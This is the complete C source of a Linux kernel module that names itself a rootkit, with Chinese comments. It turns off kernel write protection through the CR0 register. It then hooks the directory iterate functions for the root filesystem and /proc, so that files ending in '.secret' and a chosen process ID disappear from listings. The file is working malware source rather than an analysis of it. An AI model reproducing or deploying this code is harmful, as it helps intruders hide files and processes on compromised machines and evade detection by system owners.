#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/dirent.h>

// 文件系统根路径
#define FS_ROOT_PATH "/"
// /PROC根路径
#define PS_ROOT_PATH "/proc"
// 需要隐藏的文件后缀
#define SECRET_FILENAME_SUFFIX ".secret"
// 需要隐藏的pid
#define SECRET_PROC 1
// 格式化输出信息
#define printk_info(fmt, ...) printk(KERN_INFO "%s.%s\t: " fmt, THIS_MODULE->name, __func__, ##__VA_ARGS__)


int (*fs_real_iterate)(struct file *filp, struct dir_context *ctx);
int (*fs_real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

int (*ps_real_iterate)(struct file *filp, struct dir_context *ctx);
int (*ps_real_filldir)(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type);

// 检查文件后缀
bool check_file_suffix(const char *name)
{
    int len = strlen(name);
    int suffix_len = strlen(SECRET_FILENAME_SUFFIX);
    if (len >= suffix_len)
    {
        const char *check_suffix = name;
        check_suffix += len - suffix_len;
        return strcmp(check_suffix, SECRET_FILENAME_SUFFIX) == 0;
    }
    return false;
}

// 关闭写保护
void disable_wp(void) {
    unsigned long cr0;
    preempt_disable();
    cr0 = read_cr0();
    clear_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();
}

// 打开写保护
void enable_wp(void) {
    unsigned long cr0;
    preempt_disable();
    cr0 = read_cr0();
    set_bit(X86_CR0_WP_BIT, &cr0);
    write_cr0(cr0);
    preempt_enable();
}

// 替换整个文件系统下的file_operations->iterate函数
#define set_file_op(path, new_iterate, old_iterate) \
    {\
        struct file *filp;\
        struct file_operations *f_op;\
        filp = filp_open(path, O_RDONLY, 0);\
        if (IS_ERR(filp)) {\
            printk_info("Failed to open %s with error %ld.\n", path, PTR_ERR(filp));\
            old_iterate = NULL;\
        } else {\
            f_op = (struct file_operations *)filp->f_op;\
            old_iterate = f_op->iterate;\
            printk_info("Changing file_op->iterate from %p to %p.\n", old_iterate, new_iterate);\
            disable_wp();\
            f_op->iterate = new_iterate;\
            enable_wp();\
        }\
    }

// 用于隐藏文件的filldir
int fs_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
    if (check_file_suffix(name)) {
        printk_info("Hiding file: %s\n", name);
        return 0;
    }
    return fs_real_filldir(ctx, name, namlen, offset, ino, d_type);
}

// 用于隐藏文件的iterate
int fs_iterate(struct file *filp, struct dir_context *ctx) {
    fs_real_filldir = ctx->actor;
    *(filldir_t *) &ctx->actor = fs_filldir;
    return fs_real_iterate(filp, ctx);
}

// 用于隐藏进程的filldir
int ps_filldir(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned d_type) {
    char *endp;
    long pid;
    pid = simple_strtol(name, &endp, 10);

    if (pid == SECRET_PROC) {
        printk_info("Hiding pid: %ld\n", pid);
        return 0;
    }
    return ps_real_filldir(ctx, name, namlen, offset, ino, d_type);
}

// 用于隐藏进程的iterate
int ps_iterate(struct file *filp, struct dir_context *ctx) {
    ps_real_filldir = ctx->actor;
    *(filldir_t *) &ctx->actor = ps_filldir;
    return ps_real_iterate(filp, ctx);
}

// module初始化
static int __init rootkit_start(void) {
    printk_info("----------The rootkit has been installed----------\n");
    set_file_op(FS_ROOT_PATH, fs_iterate, fs_real_iterate);
    set_file_op(PS_ROOT_PATH, ps_iterate, ps_real_iterate);
    if (!fs_real_iterate || !ps_real_iterate) {
        return -ENOENT;
    }
    return 0;
}

// module退出
static void __exit rootkit_end(void) {
    int (* dummy)(struct file *, struct dir_context *);
    if (fs_real_iterate) {
        set_file_op(FS_ROOT_PATH, fs_real_iterate, dummy);
    }
    if (ps_real_iterate) {
        set_file_op(PS_ROOT_PATH, ps_real_iterate, dummy);
    }
    printk_info("----------The rootkit has been removed------------\n");
}

module_init(rootkit_start);
module_exit(rootkit_end);

MODULE_LICENSE("GPL");
